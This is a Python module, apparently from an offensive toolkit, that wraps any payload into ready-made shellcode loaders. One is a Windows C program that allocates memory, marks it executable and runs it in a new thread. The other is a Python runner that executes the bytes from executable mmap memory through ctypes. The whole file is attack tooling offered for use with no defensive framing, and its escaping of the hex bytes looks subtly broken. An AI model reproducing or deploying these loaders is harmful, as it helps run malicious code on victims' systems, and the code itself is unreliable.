#!/usr/bin/env python3
"""
Shellcode Formatter Module
"""

class ShellcodeFormatter:
    def __init__(self):
        self.name = "Shellcode Formatter"
    
    def format(self, payload):
        """Format as C-style shellcode"""
        if isinstance(payload, str):
            payload = payload.encode()
        
        # Convert to hex shellcode format
        shellcode = ''.join([f'\\\\x{byte:02x}' for byte in payload])
        
        c_template = f"""
#include <windows.h>
#include <stdio.h>

unsigned char shellcode[] = "{shellcode}";

int main() {{
    void *exec;
    BOOL rv;
    HANDLE th;
    DWORD oldprotect = 0;
    
    // Allocate memory for shellcode
    exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    
    // Copy shellcode to memory
    RtlMoveMemory(exec, shellcode, sizeof(shellcode));
    
    // Make memory executable
    rv = VirtualProtect(exec, sizeof(shellcode), PAGE_EXECUTE_READ, &oldprotect);

    if (rv != 0) {{
        // Execute shellcode
        th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec, 0, 0, 0);
        WaitForSingleObject(th, -1);
    }}
    
    return 0;
}}
"""
        return c_template
    
    def format_python_shellcode(self, payload):
        """Format as Python shellcode runner"""
        if isinstance(payload, str):
            payload = payload.encode()
        
        shellcode = ''.join([f'\\\\x{byte:02x}' for byte in payload])
        
        python_template = f'''#!/usr/bin/env python3
"""
Python Shellcode Runner
"""

import ctypes
import mmap
import os

# Shellcode
shellcode = b"{shellcode}"

def run_shellcode():
    # Allocate executable memory
    size = len(shellcode)
    memory = mmap.mmap(-1, size, prot=mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC)
    
    # Copy shellcode to memory
    memory.write(shellcode)
    
    # Cast to function pointer and execute
    func = ctypes.CFUNCTYPE(ctypes.c_void_p)(ctypes.addressof(ctypes.c_void_p.from_buffer(memory)))
    func()
    
    # Cleanup
    memory.close()

if __name__ == "__main__":
    run_shellcode()
'''
        return python_template